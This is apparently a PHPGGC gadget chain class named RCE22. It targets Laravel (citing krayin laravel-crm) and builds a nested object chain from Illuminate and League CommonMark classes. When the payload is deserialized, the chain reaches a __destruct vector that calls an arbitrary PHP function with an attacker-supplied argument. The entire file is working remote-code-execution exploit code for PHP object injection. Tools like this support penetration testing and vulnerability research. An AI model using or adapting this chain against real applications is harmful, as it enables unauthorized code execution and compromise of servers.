<?php

namespace GadgetChain\Laravel;

class RCE22 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '2.0.2+';
    public static $vector = '__destruct';
    public static $author = 'mcdruid';
    public static $information = 'https://github.com/krayin/laravel-crm';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Illuminate\Broadcasting\PendingBroadcast(
            new \League\CommonMark\Environment\Environment(
                new \League\CommonMark\Util\PrioritizedList(
                    new \League\CommonMark\Event\ListenerData(
                        new \Illuminate\Support\Testing\Fakes\ChainedBatchTruthTest(
                            $function
                        )
                    )
                )
            ),
            new \Illuminate\Broadcasting\Channel($parameter),
        );
    }
}
